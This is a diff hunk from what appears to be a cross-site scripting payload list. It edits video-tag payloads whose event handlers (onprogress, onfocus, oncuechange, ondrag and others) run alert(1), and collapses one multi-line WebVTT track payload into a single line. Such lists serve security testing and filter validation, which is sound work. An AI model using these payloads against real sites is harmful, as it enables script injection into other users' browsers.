@@ -8745,12 +8745,7 @@
 <video controls onprogress=alert(1)><source src=validvideo.mp4 type=video/mp4></video>
 <video controls src=1 onfocus=alert(1) autofocus>
 <video controls src=1 onfocusin=alert(1) autofocus>
-<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1) src="data:text/vtt,WEBVTT FILE
-
-1
-00:00:00.000 --> 00:00:05.000
-<b>XSS</b>
-"></video>
+<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1) src="data:text/vtt,WEBVTT FILE 100:00:00.000 --> 00:00:05.000<b>XSS</b>"></video>
 <video draggable="true" ondrag="alert(1)">test</video>
 <video draggable="true" ondragend="alert(1)">test</video>
 <video draggable="true" ondragenter="alert(1)">test</video>
